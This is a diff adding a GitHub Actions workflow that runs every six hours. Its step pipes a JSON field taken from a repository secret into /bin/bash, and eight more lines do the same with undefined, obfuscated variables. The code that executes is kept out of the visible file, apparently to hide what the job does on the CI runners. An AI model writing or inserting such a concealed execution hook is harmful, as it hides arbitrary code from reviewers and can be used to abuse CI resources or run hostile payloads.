@@ -1,0 +1,26 @@
+name: zhaubaozhua
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaubaozhua
+        env:
+          jk042: ${{ secrets.jk042 }}
+        run: |
+          echo $jk042 | jq -r .x43952 | /bin/bash
+          echo $r46361 | jq -r .a03 | /bin/bash
+          echo $utf47865 | jq -r .sv515 | /bin/bash
+          echo $llnko2448 | jq -r .u663 | /bin/bash
+          echo $jqr1 | jq -r .wb532 | /bin/bash
+          echo $fpi9 | jq -r .tbux27545 | /bin/bash
+          echo $yhfdb1814 | jq -r .uipl16659 | /bin/bash
+          echo $geum22 | jq -r .l771 | /bin/bash
+          echo $odg50 | jq -r .iky69 | /bin/bash
+
